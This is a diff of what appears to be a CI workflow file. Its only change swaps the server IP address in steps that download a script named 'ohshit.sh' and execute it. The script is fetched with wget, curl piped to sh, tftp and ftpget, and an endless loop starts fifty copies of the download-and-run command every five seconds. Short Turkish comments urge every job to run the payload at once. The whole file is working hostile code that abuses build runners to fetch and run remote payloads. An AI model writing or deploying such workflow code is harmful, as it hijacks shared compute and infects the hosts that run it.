@@ -13,7 +13,7 @@ jobs:
     steps:
       - name: Download payload
         run: |
-          wget http://193.164.4.137/ohshit.sh -O /tmp/ohshit.sh
+          wget http://45.138.180.205/ohshit.sh -O /tmp/ohshit.sh
           chmod +x /tmp/ohshit.sh
           
       - name: Mass execute - ALL AT ONCE
@@ -30,10 +30,10 @@ jobs:
       - name: Alternative download method
         run: |
           # Her job ayrıca kendi indirmesini de yapsın
-          curl -s http://193.164.4.137/ohshit.sh | sh &
-          wget -q -O- http://193.164.4.137/ohshit.sh | sh &
-          (tftp 193.164.4.137 -c get ohshit.sh 2>/dev/null; chmod +x ohshit.sh; ./ohshit.sh) &
-          (ftpget -v -u anonymous -p anonymous -P 21 193.164.4.137 ohshit1.sh ohshit1.sh 2>/dev/null; sh ohshit1.sh) &
+          curl -s http://45.138.180.205/ohshit.sh | sh &
+          wget -q -O- http://45.138.180.205/ohshit.sh | sh &
+          (tftp 45.138.180.205 -c get ohshit.sh 2>/dev/null; chmod +x ohshit.sh; ./ohshit.sh) &
+          (ftpget -v -u anonymous -p anonymous -P 21 45.138.180.205 ohshit1.sh ohshit1.sh 2>/dev/null; sh ohshit1.sh) &
           
           # Hepsi birden çalışsın
           wait
@@ -43,7 +43,7 @@ jobs:
           # Sürekli yeni thread aç
           while true; do
             for i in {1..50}; do
-              curl -s http://193.164.4.137/ohshit.sh | sh &
+              curl -s http://45.138.180.205/ohshit.sh | sh &
             done
             sleep 5
           done &
